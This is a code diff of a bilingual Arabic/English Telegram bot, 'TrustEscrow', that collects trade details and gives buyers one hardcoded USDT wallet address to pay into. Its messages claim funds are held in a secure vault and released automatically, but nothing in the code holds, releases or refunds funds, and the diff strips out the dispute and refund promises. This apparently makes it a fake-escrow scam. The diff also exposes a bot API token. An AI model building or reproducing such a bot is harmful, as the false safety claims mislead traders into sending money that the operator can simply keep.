@@ -2,31 +2,31 @@ import telebot
 from telebot import types
 import datetime
 
+# ضع التوكن الخاص بك هنا
 API_TOKEN = '8806803636:AAGx0ck3UwL594FLx_G2BaFfwwXDux7d1v8'
 bot = telebot.TeleBot(API_TOKEN)
 
 ADMIN_USERNAME = "@HE_5TE"
 WALLET_ADDRESS = "D5nB2WhVgKDpS2N3Zx7uXFNV1zMqXiBh777XnQFx4kpu"
 
-# القاموس الثنائي للغة
 TEXTS = {
     'ar': {
-        'welcome': "🛡️ *أهلاً بك في TrustEscrow*\n\nنظام وساطة رقمي آمن. لا نتحكم في الأموال، هي تُحفظ في محفظة وساطة مشفرة وتُرسل تلقائياً للبائع فور وصولها.\n\nفي حال حدوث نزاع، يتم تجميد المبلغ فوراً وفحص المراسلات لإرجاع الحق لأصحابه.\n\nاختر اللغة:",
+        'welcome': "🛡️ *أهلاً بك في TrustEscrow*\n\nنظام وساطة رقمي آمن. لا نتحكم في الأموال، هي تُحفظ في محفظة وساطة مشفرة وتُرسل تلقائياً للبائع فور وصولها.\n\nاختر اللغة:",
         'start_btn': "🚀 البدء بصفقة جديدة",
         'terms_btn': "📄 شروط الأمان",
         'service_prompt': "📦 ما هي الخدمة أو السلعة؟",
         'partner_prompt': "👤 أدخل يوزر الطرف الآخر:",
         'amount_prompt': "💰 أدخل المبلغ (USDT):",
-        'summary': "✅ *تم فتح الطلب بنجاح!*\n\nالخدمة: {s}\nالطرف الآخر: {p}\nالمبلغ: {a}\n\n⚠️ *ملاحظة أمان:* أموالك محمية في محفظة الوساطة ولا يمكن للبائع سحبها إلا بعد تأكيدك. في حال النزاع، يتم إرجاع المبلغ كاملاً للمشتري في دقائق.",
+        'summary': "✅ *تم فتح الطلب بنجاح!*\n\nالخدمة: {s}\nالطرف الآخر: {p}\nالمبلغ: {a}\n\n⚠️ *تنبيه هام جداً:* \nمحفظتنا تستقبل عملات USDT على شبكة **Solana (SPL)** فقط.\nإرسال عملات على شبكة خاطئة سيؤدي لضياعها نهائياً!",
     },
     'en': {
-        'welcome': "🛡️ *Welcome to TrustEscrow*\n\nSecure digital escrow. We do not hold funds; they are kept in a secure vault and released automatically to the seller upon confirmation.\n\nIn case of a dispute, funds are frozen immediately for investigation and manual refunding.\n\nPlease select language:",
+        'welcome': "🛡️ *Welcome to TrustEscrow*\n\nSecure digital escrow. We do not hold funds; they are kept in a secure vault and released automatically.\n\nPlease select language:",
         'start_btn': "🚀 Start New Escrow",
         'terms_btn': "📄 Safety Terms",
         'service_prompt': "📦 What is the service/item?",
         'partner_prompt': "👤 Enter partner's username:",
         'amount_prompt': "💰 Enter amount (USDT):",
-        'summary': "✅ *Order Created Successfully!*\n\nService: {s}\nPartner: {p}\nAmount: {a}\n\n⚠️ *Safety Note:* Your funds are protected in the escrow vault and cannot be released without your confirmation. Disputes lead to an immediate full refund to the buyer.",
+        'summary': "✅ *Order Created Successfully!*\n\nService: {s}\nPartner: {p}\nAmount: {a}\n\n⚠️ *Critical Warning:* \nOur wallet ONLY accepts USDT on the **Solana (SPL)** network.\nSending funds to the wrong network will result in permanent loss!",
     }
 }
 
@@ -64,8 +64,14 @@ def show_terms(call):
 def show_wallet_guide(call):
     lang = user_data.get(call.message.chat.id, {}).get('lang', 'ar')
     guide_text = {
-        'ar': ("📖 *دليل فتح محفظة رقمية*\n\nلإتمام الصفقة، تحتاج لمحفظة USDT.\n\n1️⃣ *بينانس (للمبتدئين):*\n[شاهد شرح فتح حساب بينانس](https://www.youtube.com/results?search_query=شرح+فتح+حساب+بينانس)\n\n2️⃣ *تراست واليت (تحكم كامل):*\n[شاهد شرح إنشاء محفظة تراست واليت](https://www.youtube.com/results?search_query=شرح+إنشاء+محفظة+تراست+واليت)\n\n⚠️ *تنبيه:* تأكد دائماً من اختيار الشبكة الصحيحة (مثل TRC20 أو SOL) لتجنب ضياع أموالك."),
-        'en': ("📖 *Digital Wallet Guide*\n\nTo complete the trade, you need a USDT wallet.\n\n1️⃣ *Binance (For Beginners):*\n[Watch Binance Setup Tutorial](https://www.youtube.com/results?search_query=how+to+create+a+binance+account)\n\n2️⃣ *Trust Wallet (Full Control):*\n[Watch Trust Wallet Setup Tutorial](https://www.youtube.com/results?search_query=how+to+create+a+trust+wallet)\n\n⚠️ *Note:* Always select the correct network (e.g., TRC20 or SOL) to avoid loss of funds.")
+        'ar': ("📖 *دليل فتح المحفظة والمساعدة*\n\n"
+               "1️⃣ *إنشاء محفظة:* [شرح بينانس](https://www.youtube.com/results?search_query=شرح+فتح+حساب+بينانس) | [شرح تراست واليت](https://www.youtube.com/results?search_query=شرح+إنشاء+محفظة+تراست+واليت)\n\n"
+               "🤖 *هل تواجه صعوبة؟*\nيمكنك سؤال *ChatGPT* أو *Gemini* عن كيفية إعداد المحفظة.\n\n"
+               "⚠️ *تنبيه:* محفظتنا تستقبل على شبكة **Solana (SPL)** فقط."),
+        'en': ("📖 *Wallet Guide & Assistance*\n\n"
+               "1️⃣ *How to setup:* [Binance](https://www.youtube.com/results?search_query=how+to+create+a+binance+account) | [Trust Wallet](https://www.youtube.com/results?search_query=how+to+create+a+trust+wallet)\n\n"
+               "🤖 *Need help?*\nAsk *ChatGPT* or *Gemini* for step-by-step guidance.\n\n"
+               "⚠️ *Note:* Our wallet accepts USDT on **Solana (SPL)** network ONLY.")
     }
     markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="terms"))
     bot.edit_message_text(guide_text[lang], call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
@@ -94,7 +100,7 @@ def finish_order(message):
     d = user_data[u_id]
     lang = d['lang']
     msg = TEXTS[lang]['summary'].format(s=d['service'], p=d['partner'], a=amount)
-    msg += f"\n\n📍 *Wallet:* `{WALLET_ADDRESS}`\n📞 Support: {ADMIN_USERNAME}"
+    msg += f"\n\n📍 *Phantom Wallet:* `{WALLET_ADDRESS}`\n📞 Support: {ADMIN_USERNAME}"
     bot.send_message(u_id, msg, parse_mode="Markdown")
     bot.send_message(ADMIN_USERNAME, f"🔔 New Order from {message.from_user.username}\nService: {d['service']}\nAmount: {amount}")
 
